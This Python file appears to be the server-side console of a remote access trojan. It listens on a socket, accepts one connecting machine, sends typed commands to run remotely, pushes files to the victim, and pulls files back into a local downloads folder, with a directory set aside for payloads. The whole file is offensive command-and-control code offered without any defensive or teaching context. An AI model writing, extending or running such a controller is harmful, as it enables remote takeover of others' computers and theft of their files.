import socket
import time
import os
from tqdm import tqdm
import random
from flask import Flask
import pickle

SERVER_HOST = "SERVER IP"
SERVER_PORT = 6970

BUFFER_SIZE = 536870912

logfilename = f"logs/{str(SERVER_PORT)}"


with open("data.pickle", "rb") as w:
    data = pickle.load(w)




s = socket.socket()
if not os.path.exists("downloads"):
    os.mkdir("downloads")

if not os.path.exists("payloads"):
    os.mkdir("payloads")

def writelogs(args):
    with open(logfilename, "a") as logfile:
        try:
            logfile.write(args + "\n")
        except:
            logfile.write(args + b"\n")

with open(logfilename, "w") as logfile:
    logfile.write("--LOGS--\n")

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
writelogs(f"Listening on {SERVER_HOST}:{SERVER_PORT} ...")
print(f"Listening on {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
writelogs(f"{client_address[0]}:{client_address[1]} Connected!")
print(f"{client_address[0]}:{client_address[1]} Connected!")

message = "Connected".encode()
client_socket.send(message)

data[SERVER_PORT] = [f"{client_address[0]}:{client_address[1]}", 1]
with open("data.pickle", "wb") as w:
    pickle.dump(data, w)

def port6004():
    while True:
        try:
            
            
            cmd = input(">> ")
            writelogs(f">> {cmd}")
            if cmd == "":
                continue
            elif cmd == "!upd":
                print(rd)
                #rd = client_socket.recv(BUFFER_SIZE)

                command = "!!::SKIP::!!"
            elif cmd[0] != "!":
                command = f"cmd::{cmd}"
                
            else:
                command = cmd

            client_socket.send(command.encode())
            if cmd.lower() == "exit":
                time.sleep(2)
                exit()
            
            
            ########
            if cmd[:8] == "!upload ":
                filea = command[8:]
                try:
                    with open(filea, 'rb') as file:
                        content = file.read()
                        total_length = len(content)
                        chunk_size = total_length // 50
                        m = 1

                        for i in range(0, total_length, chunk_size):
                            
                            time.sleep(0.5)
                            chunk = content[i:i+chunk_size]
                            if i == 0:
                                output = b"FILE:" + chunk
                            else:
                                output = chunk

                            
                            client_socket.send(output)
                            a = client_socket.recv(BUFFER_SIZE)
                            if a.decode() == "<ERROR>":
                                break
                            if m < 10:
                                print(f"0{m} Packets sent >> {filea}")
                                writelogs(f"0{m} Packets sent >> {filea}")
                            else:
                                print(f"{m} Packets sent >> {filea}")
                                writelogs(f"{m} Packets sent >> {filea}")
                            m = m + 1
                    
                    
                    client_socket.send(b"<FINISHED>")
                except IsADirectoryError:
                    output = f"<{filea}> Is a directory"
                    print(output)
                except FileNotFoundError:
                    output = f"<{filea}> does not exist"
                    print(output)
                except PermissionError:
                    output = f"<{filea}> You do not have enough permissions to read this file"
                    print(output)

            ########
            
            
            rd = client_socket.recv(BUFFER_SIZE)

            

            if command[:10] == "!download ":
                
                
                filename = command[10:]
                fileformat = os.path.splitext(filename)[1]
                filename = os.path.splitext(filename)[0]

                fane = "downloads/" + filename + fileformat
            
            if rd[:5] == b"FILE:":

                filedata = rd[5:]
                with open(f"{fane}", "wb") as w:
                    w.write(filedata)
                i = 0
                while True:
                    
                    
                    client_socket.send("ACK".encode())
                    
                    rd = client_socket.recv(BUFFER_SIZE)
                    if rd == b"<FINISHED>":
                        break
                    with open(f"{fane}", "ab") as w:
                        w.write(rd)
                    if i < 9:
                        print(f"0{i+1} packets received >> {fane}")
                        writelogs(f"0{i+1} packets received >> {fane}")
                    else:
                        print(f"{i+1} packets received >> {fane}")
                        writelogs(f"{i+1} packets received >> {fane}")
                    i=i+1
                

                    
                continue
            else:
                results = rd.decode()
                writelogs(rd.decode())
                time.sleep(0.25)
                print(results)

        except KeyboardInterrupt:
            print("")
            print("exitting...")
            command = "cmd::exit"
            client_socket.send(command.encode())
            time.sleep(2)
            break


    

port6004()